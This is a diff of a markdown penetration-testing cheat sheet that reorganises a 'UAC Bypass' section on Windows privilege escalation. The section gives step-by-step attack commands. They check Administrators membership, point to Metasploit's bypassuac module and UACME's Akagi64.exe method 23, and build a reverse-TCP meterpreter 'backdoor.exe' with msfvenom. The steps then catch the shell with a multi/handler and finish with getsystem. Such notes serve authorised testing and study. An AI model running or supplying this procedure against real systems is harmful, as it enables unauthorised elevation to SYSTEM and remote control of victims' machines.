@@ -44,23 +44,24 @@
 <summary>UAC Bypass</summary>
  
 - User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
+- Prerequisites:
+  1.  User must be a member of the Administrators group.
+     - `net localgroup administrators`
+  2. Full interactive shell with the victim (a common nc.exe shell is not enough).
+     - You can use meterpreter
+- Metasploit
+  - search module bypassuac ...
 - UACME
-  - Prerequisites:
-    1.  User must be a member of the Administrators group.
-       - `net localgroup administrators`
-    2. Full interactive shell with the victim (a common nc.exe shell is not enough).
-       - You can use meterpreter
-  - Procedure
-    1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
-       - `ps` to show process 
-       - (ex. `migrate <PID explorer.exe>`)
-    3. Upload Akagi (Akagi64.exe if x64)
-    3. Create payload with msfvenom
-       - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
-    5. Use exploit/multi/handler to start a listener
-    6. Akagi64.exe 23 <payload_full_path>
-       - **NOTE FULL PATH**
-    7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
+  1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
+     - `ps` to show process 
+     - (ex. `migrate <PID explorer.exe>`)
+  3. Upload Akagi (Akagi64.exe if x64)
+  3. Create payload with msfvenom
+     - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
+  5. Use exploit/multi/handler to start a listener
+  6. Akagi64.exe 23 <payload_full_path>
+     - **NOTE FULL PATH**
+  7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
       
 </details>
 
